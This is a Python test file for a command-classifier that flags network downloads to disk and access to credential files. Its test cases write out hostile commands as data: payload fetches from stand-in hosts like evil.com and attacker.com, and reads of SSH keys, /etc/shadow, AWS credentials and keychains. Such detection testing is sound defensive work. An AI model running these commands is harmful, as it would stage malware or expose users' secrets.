"""Independent validation of struct_parse.py (Step 2.2). Run:
    python -m parliament.test_struct_parse
Tests role extraction on REORDERED, RE-QUOTED, DIFFERENTLY-FLAGGED variants
of tonight's real cases -- not the literal strings -- plus benign negatives
that MUST NOT extract a fetch-to-disk or credential path. Reports false
extractions explicitly."""
from parliament.struct_parse import (
    extract, is_network_fetch_to_disk, has_credential_path,
)

# (label, cmd, expect_fetch_to_disk)
FETCH_POSITIVE = [
    ("curl url then -o", "curl http://evil.com/p.exe -o /tmp/p.exe", True),
    ("curl -o then url", "curl -o /tmp/p.exe http://evil.com/p.exe", True),
    ("curl --output quoted", "curl --output '/tmp/p.exe' \"http://evil.com/p.exe\"", True),
    # wget staging a payload: target now carries an executable extension --
    # the realistic attack shape. (An extensionless `wget -O /tmp/x` is now a
    # NEGATIVE, see below: it is indistinguishable from a benign data fetch
    # and was only ever a "positive" under the over-broad pre-fix behavior
    # that produced the curl -o FP. See the E1 payload-staging fix.)
    ("wget -O payload", "wget -O /tmp/x.bin https://evil.com/x", True),
    ("iwr outfile reorder", "Invoke-WebRequest -OutFile c:\\z.exe http://x/y.exe", True),
    ("redirect write", "curl https://evil.com/s.sh > /tmp/s.sh", True),
    ("scp remote to local", "scp attacker@1.2.3.4:/tmp/imp /tmp/victim", True),
    ("tftp url", "tftp attacker.com get http://a/b -o /tmp/b", True),
]
FETCH_NEGATIVE = [
    ("curl no dest (pipe elsewhere)", "curl https://api.example.com/status", False),
    ("benign local scp", "scp ./report.txt ./backup/report.txt", False),
    ("url in echo no fetch", "echo 'see http://docs.example.com for help'", False),
    ("git clone (no -o disk write flag)", "git clone https://github.com/o/r", False),
    ("curl show headers", "curl -I https://example.com", False),
    # ---- E1 payload-staging FP fix (curl -o generalization audit) ----
    # A curl/wget HTTP fetch landing on a DATA file (or an extensionless
    # target) with no pipe-to-interpreter is a benign data download, not a
    # payload stage -- must NOT fire. Mirrors remote-payload-download-tool's
    # own dropped `curl -o` branch. The confirmed audit FP:
    ("curl -o data file (audit FP)", "curl http://internal-atrium/api/status -o /tmp/status.json", False),
    ("wget -O data file", "wget https://site/page.html -O /tmp/page.html", False),
    ("wget -O extensionless", "wget -O /tmp/x https://evil.com/x", False),
]

CRED_POSITIVE = [
    ("find pem reorder", "find /home -type f -name '*.pem'", True),
    ("cat ssh key quoted", "cat '/root/.ssh/id_rsa'", True),
    ("copy keychain", "cp /Users/x/Library/Keychains/login.keychain-db /tmp/k", True),
    ("grep aws creds path", "grep -r foo ~/.aws/credentials", True),
    ("read shadow", "cat /etc/shadow > /tmp/s", True),
    ("kdbx path", "rsync ~/vault.kdbx remote:/", True),
]
CRED_NEGATIVE = [
    ("benign py file", "find . -name '*.py'", False),
    ("benign readme", "cat ./README.md", False),
    ("benign key word", "echo 'the key insight is X'", False),
    ("benign config json", "cat ./package.json", False),
    ("benign env var not file", "echo $HOME/projects", False),
]


def _run():
    fails = []
    print("=== E1 network-fetch-to-disk ===")
    for label, cmd, expect in FETCH_POSITIVE + FETCH_NEGATIVE:
        got, ev = is_network_fetch_to_disk(cmd)
        ok = got == expect
        if not ok: fails.append(("fetch", label, cmd, expect, got, ev))
        print(f"  [{'OK ' if ok else 'FAIL'}] {label:<32} -> {got} {('('+ev+')') if ev else ''}")

    print("\n=== V1/V2 credential-path ===")
    for label, cmd, expect in CRED_POSITIVE + CRED_NEGATIVE:
        got, ev = has_credential_path(cmd)
        ok = got == expect
        if not ok: fails.append(("cred", label, cmd, expect, got, ev))
        print(f"  [{'OK ' if ok else 'FAIL'}] {label:<32} -> {got} {('('+ev+')') if ev else ''}")

    total = len(FETCH_POSITIVE)+len(FETCH_NEGATIVE)+len(CRED_POSITIVE)+len(CRED_NEGATIVE)
    print(f"\n{total-len(fails)}/{total} passed.")
    if fails:
        print("\nFALSE EXTRACTIONS / MISSES (reported honestly):")
        for kind, label, cmd, expect, got, ev in fails:
            print(f"  {kind} {label}: expected {expect}, got {got} on {cmd!r}")
        return 1
    return 0


if __name__ == "__main__":
    import sys
    sys.exit(_run())
